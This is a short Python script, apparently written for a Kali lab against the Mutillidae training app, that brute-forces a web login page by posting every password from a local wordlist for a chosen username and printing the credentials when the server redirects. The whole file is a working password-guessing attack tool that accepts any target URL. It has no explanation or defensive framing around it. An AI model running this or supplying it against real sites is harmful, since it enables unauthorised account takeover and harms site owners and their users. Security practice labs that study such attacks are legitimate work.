import requests

#source sa7ee7.com with my edit on it
#target_url = "http://192.168.6.131/mutillidae/index.php?page=login.php"
try:
    data_dictionary = {"username": "", "password": "", "login-php-submit-button": "Login"}
    target_url = input("\nEnter URL for Login Page to Bruteforce: ")
    if "page=login" not in target_url:
        print("\n[-] This is not a Login Page ! Try again with proper link.")
        exit()
    name = input("\nEnter The Username: ")
    with open("/home/kali/Desktop/pass_file.txt", "r") as wordlist_file:
        print("Trying passwords in the account "+name+": \n")
        data_dictionary["username"] = name
        for line in wordlist_file:
            word = line.strip()
            data_dictionary["password"] = word
            response = requests.post(target_url, data=data_dictionary, allow_redirects=False)
            print(word)
            if response.status_code == 302:
                print("----"*15)
                print("\nFound The correct Credentials: ")
                print("\n[+] Username --> "+ data_dictionary["username"])
                print("[+] Password --> " + data_dictionary["password"]+"\n")
                exit()
        else:
            print("\n[-] None of the passwords work or the Username dosent exist! ")
except SystemExit:
    pass
except KeyboardInterrupt:
    print("")
    print("----" * 15)
    print("")
    print("[+] Exiting.. ")
    exit()
except:
    print("----" * 15)
    print("\n[-] Somthing Worng ! try run the code again.")